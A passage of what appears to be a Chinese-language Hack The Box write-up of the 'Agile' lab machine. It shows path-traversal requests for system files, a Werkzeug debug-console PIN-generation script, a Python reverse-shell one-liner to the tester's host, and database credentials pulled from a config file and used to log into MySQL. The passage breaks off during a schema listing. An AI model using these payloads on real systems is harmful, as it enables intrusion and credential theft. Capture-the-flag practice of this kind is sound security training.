class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">pollinate:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/cache/pollinate</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">usbmux:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">46</span><span class="hljs-symbol">:usbmux</span> daemon,,,<span class="hljs-symbol">:/var/lib/usbmux</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">corum:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:corum</span><span class="hljs-symbol">:/home/corum</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">dnsmasq:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:dnsmasq</span>,,,<span class="hljs-symbol">:/var/lib/misc</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">runner:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/app/app-testing/</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-symbol">edwards:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/edwards</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">dev_admin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/dev_admin</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">_laurel:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/log/laurel</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure>
+
+<p>12、可以发现有两个普通用户，但是都没有权限，无法读取SSH秘钥</p>
+<p>13、到这里就是需要结合这个本地包含漏洞和那个werkzeug控制台来获取初始shell了，下面是漏洞参考文章</p>
+<p><code>https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、一些前提条件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">要利用控制台 PIN，需要两组变量，probably_public_bits 和 private_bits：<br><br>probably_public_bits<br>username: 指发起 Flask 会话的用户。<br><br>modname: 通常指定为 flask.app。<br><br>getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>)): 通常解析为 Flask。<br><br>getattr(mod, <span class="hljs-string">&#x27;__file__&#x27;</span>, None): 表示 Flask 目录中 app.py 的完整路径（例如，<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">5</span><span class="hljs-regexp">/dist-packages/</span>flask/app.py）。如果 app.py 不适用，尝试 app.pyc。<br><br><br>private_bits<br>uuid.getnode(): 获取当前机器的 MAC 地址，str(uuid.getnode()) 将其转换为十进制格式。<br><br>要 确定服务器的 MAC 地址，必须识别应用使用的活动网络接口（例如，ens3）。如果不确定，泄露 <span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/arp 以找到设备 ID，然后 从 /</span>sys<span class="hljs-regexp">/class/</span>net<span class="hljs-regexp">/&lt;device id&gt;/</span>address 提取 MAC 地址。<br><br>可以按如下方式将十六进制 MAC 地址转换为十进制：<br><br><span class="hljs-comment"># 示例 MAC 地址: 56:00:02:7a:23:ac</span><br>&gt;&gt;&gt; print(<span class="hljs-number">0</span>x5600027a23ac)<br><span class="hljs-number">94558041547692</span><br><br>get_machine_id(): 将 <span class="hljs-regexp">/etc/m</span>achine-id 或 <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random<span class="hljs-regexp">/boot_id 中的数据与 /</span>proc<span class="hljs-regexp">/self/</span>cgroup 的第一行在最后一个斜杠（/）之后的部分连接起来。<br><br><br>get_machine_id(): 将 <span class="hljs-regexp">/etc/m</span>achine-id 或 <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random<span class="hljs-regexp">/boot_id 中的数据与 /</span>proc<span class="hljs-regexp">/self/</span>cgroup 的第一行在最后一个斜杠（/）之后的部分连接起来。<br></code></pre></td></tr></table></figure>
+
+<p>15、接下来就是整个的利用过程</p>
+<p><code>http://superpass.htb/download?fn=../../../../../../../../../../proc/net/arp</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://superpass.htb/download?fn=../../../../../sys/class/net/eth0/address</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/15.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://superpass.htb/download?fn=../../../../../../../../../../etc/machine-id</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://superpass.htb/download?fn=../../../../../proc/self/cgroup</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/13.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://superpass.htb/download?fn=../../../../../proc/sys/kernel/random/boot_id</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>16、十六进制 MAC 地址到十进制的转换可以按如下方式进行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3               <br>Python <span class="hljs-number">3.11</span>.<span class="hljs-number">9</span> (main, Apr <span class="hljs-number">10</span> <span class="hljs-number">2024</span>, <span class="hljs-number">13</span>:<span class="hljs-number">16</span>:<span class="hljs-number">36</span>) [GCC <span class="hljs-number">13.2</span>.<span class="hljs-number">0</span>] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; print(<span class="hljs-number">0</span>x005056b93312)<br><span class="hljs-number">345052361490</span><br>&gt;&gt;&gt; <span class="hljs-keyword">exit</span>()<br></code></pre></td></tr></table></figure>
+
+<p>17、贴出利用代码：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vim">import hashlib<br>from itertools import chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;www-data&#x27;</span>,  # username<br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  # modname<br>    <span class="hljs-string">&#x27;wsgi_app&#x27;</span>,  # getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>))<br>    <span class="hljs-string">&#x27;/app/venv/lib/python3.10/site-packages/flask/app.py&#x27;</span>  # getattr(<span class="hljs-keyword">mod</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, None),<br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;345052361490&#x27;</span>,  # str(uuid.getnode()),  /sys/class/net/ens33/address<br>    <span class="hljs-string">&#x27;ed5b159560f54721827644bc9b220d00superpass.service&#x27;</span>  # get_machine_id(), /etc/machine-id<br>]<br><br># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">en</span>/<span class="hljs-number">2.2</span>.<span class="hljs-keyword">x</span>/<span class="hljs-keyword">changes</span>/#version-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit in chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> not bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> isinstance(bit, str):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.<span class="hljs-keyword">update</span>(bit)<br>h.<span class="hljs-keyword">update</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;cookiesalt&#x27;</span>)<br># h.<span class="hljs-keyword">update</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;shittysalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = None<br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> None:<br>    h.<span class="hljs-keyword">update</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-keyword">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br><span class="hljs-keyword">rv</span> = None<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">rv</span> <span class="hljs-keyword">is</span> None:<br>    <span class="hljs-keyword">for</span> group_size in <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">rv</span> = <span class="hljs-string">&#x27;-&#x27;</span>.<span class="hljs-keyword">join</span>(num[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">rv</span> = num<br><br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">rv</span>)<br></code></pre></td></tr></table></figure>
+
+<p>18、运行脚本</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(kali㉿offsec)-<span class="hljs-selector-attr">[~/Desktop]</span><br>└─$ python3 pin<span class="hljs-selector-class">.py</span><br><span class="hljs-number">629</span>-<span class="hljs-number">963</span>-<span class="hljs-number">121</span><br></code></pre></td></tr></table></figure>
+
+<p>19、输入上述的PIN后，即可进入控制台</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">[console ready]<br>&gt;&gt;&gt; <span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;id&#x27;</span>).<span class="hljs-built_in">read</span>()<br><span class="hljs-string">&#x27;uid=33(www-data) gid=33(www-data) groups=33(www-data)\n&#x27;</span><br>&gt;&gt;&gt; <br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/17.png" srcset="/img/loading.gif" lazyload></p>
+<p>20、我们成功输入了PIN码，并进入了调试界面，也成功的执行了命令，下面就是获取shell权限吧</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> socket,subprocess,<span class="hljs-built_in">os</span>;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.14.22&quot;</span>,<span class="hljs-number">443</span>));<span class="hljs-built_in">os</span>.dup2(s.fileno(),<span class="hljs-number">0</span>); <span class="hljs-built_in">os</span>.dup2(s.fileno(),<span class="hljs-number">1</span>);<span class="hljs-built_in">os</span>.dup2(s.fileno(),<span class="hljs-number">2</span>);<span class="hljs-keyword">import</span> pty; pty.spawn(<span class="hljs-string">&quot;bash&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>21、然后获取到了反弹shell</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(kali㉿offsec)-[~/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-variable">$ </span>rlwrap nc -lvnp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.22</span>] from (<span class="hljs-title class_">UNKNOWN</span>) [<span class="hljs-number">10.10</span>.<span class="hljs-number">11.203</span>] <span class="hljs-number">40378</span><br>(venv) www-data<span class="hljs-variable">@agile</span><span class="hljs-symbol">:/app/app</span><span class="hljs-variable">$ </span>id<br>id<br>uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>(venv) www-data<span class="hljs-variable">@agile</span><span class="hljs-symbol">:/app/app</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>22、接下来，我通过查看配置文件，和数据库登录操作，发现了几个密码</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">(venv) www-data<span class="hljs-meta">@agile:/app/app$</span> ls -la<br>ls -la<br>total 28<br>drwxr-xr-x 5 corum runner 4096 Feb  8  2023 .<br>drwxr-xr-x 6 root  root   4096 Mar  8  2023 ..<br>drwxrwxr-x 3 corum runner 4096 Feb  8  2023 .pytest_cache<br>drwxr-xr-x 2 corum runner 4096 Feb  8  2023 __pycache__<br>-rw-rw-r-- 1 corum runner   95 Jan 23  2023 requirements.txt<br>drwxrwxr-x 9 corum runner 4096 Mar  7  2023 superpass<br>-rw-r--r-- 1 corum runner  105 Jan 24  2023 wsgi.py<br>(venv) www-data<span class="hljs-meta">@agile:/app/app$</span> cd ../<br>cd ../<br>(venv) www-data<span class="hljs-meta">@agile:/app$</span> ls -la<br>ls -la<br>total 36<br>drwxr-xr-x  6 root      root      4096 Mar  8  2023 .<br>drwxr-xr-x 20 root      root      4096 Feb 20  2023 ..<br>drwxr-xr-x  3 root      root      4096 Jan 23  2023 .pytest_cache<br>drwxr-xr-x  5 corum     runner    4096 Feb  8  2023 app<br>drwxr-xr-x  9 runner    runner    4096 Feb  8  2023 app-testing<br>-r--r-----  1 dev_admin www-data    88 Jan 25  2023 config_prod.json<br>-r--r-----  1 dev_admin runner      99 Jan 25  2023 config_test.json<br>-rwxr-xr-x  1 root      runner     557 Sep 29 08:39 test_and_update.sh<br>drwxrwxr-x  5 root      dev_admin 4096 Feb  8  2023 venv<br>(venv) www-data<span class="hljs-meta">@agile:/app$</span> cat config_prod.json<br>cat config_prod.json<br>&#123;<span class="hljs-string">&quot;SQL_URI&quot;</span>: <span class="hljs-string">&quot;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&quot;</span>&#125;(venv) www-data<span class="hljs-meta">@agile:/app$</span> <br><br>(venv) www-data<span class="hljs-meta">@agile:/app$</span> cat config_test.json<br>cat config_test.json<br>cat: config_test.json: Permission denied<br>(venv) www-data<span class="hljs-meta">@agile:/app$</span> <br><br><br>(venv) www-data<span class="hljs-meta">@agile:/app$</span> ls -la /home/<br>ls -la /home/<br>total 20<br>drwxr-xr-x  5 root      root      4096 Feb  8  2023 .<br>drwxr-xr-x 20 root      root      4096 Feb 20  2023 ..<br>drwxr-x---  8 corum     corum     4096 Feb  8  2023 corum<br>drwxr-x---  2 dev_admin dev_admin 4096 Feb  8  2023 dev_admin<br>drwxr-x---  5 edwards   edwards   4096 Feb  8  2023 edwards<br>(venv) www-data<span class="hljs-meta">@agile:/app$</span> <br><br><br><br>(venv) www-data<span class="hljs-meta">@agile:/app$</span> mysql -u superpassuser -p&#x27;dSA6l7q<span class="hljs-symbol">*</span>yIVs$39Ml6ywvgK&#x27;<br><span class="hljs-variable">&lt; mysql -u superpassuser -p&#x27;dSA6l7q*yIVs$39Ml6ywvgK&#x27;</span><br><span class="hljs-variable">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="hljs-variable">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="hljs-variable">Your MySQL connection id is 32</span><br><span class="hljs-variable">Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">Copyright (c) 2000, 2023, Oracle and/or its affiliates.</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="hljs-variable">affiliates. Other names may be trademarks of their respective</span><br><span class="hljs-variable">owners.</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">mysql&gt;</span> <br>mysql&gt; SSELECT table_schema, table_name FROM information_schema.tables<br>SELECT table_schema, table_name FROM information_schema.tables<br>    -&gt; ;<br>;<br>+--------------------+---------------------------------------+<br>|<span class="hljs-string"> TABLE_SCHEMA       </span>|<span class="hljs-string"> TABLE_NAME                            </span>|<br>+--------------------+---------------------------------------+<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> CHARACTER_SETS                        </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> CHECK_CONSTRAINTS                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> COLLATIONS                            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> COLLATION_CHARACTER_SET_APPLICABILITY </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> COLUMNS                               </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> COLUMNS_EXTENSIONS                    </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> COLUMN_STATISTICS                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> EVENTS                                </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> FILES                                 </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_DATAFILES                      </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FOREIGN                        </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FOREIGN_COLS                   </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FIELDS                         </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_TABLESPACES_BRIEF              </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> KEY_COLUMN_USAGE                      </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> KEYWORDS                              </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> PARAMETERS                            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> PARTITIONS                            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> REFERENTIAL_CONSTRAINTS               </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> RESOURCE_GROUPS                       </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ROUTINES                              </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> SCHEMATA                              </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> SCHEMATA_EXTENSIONS                   </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> 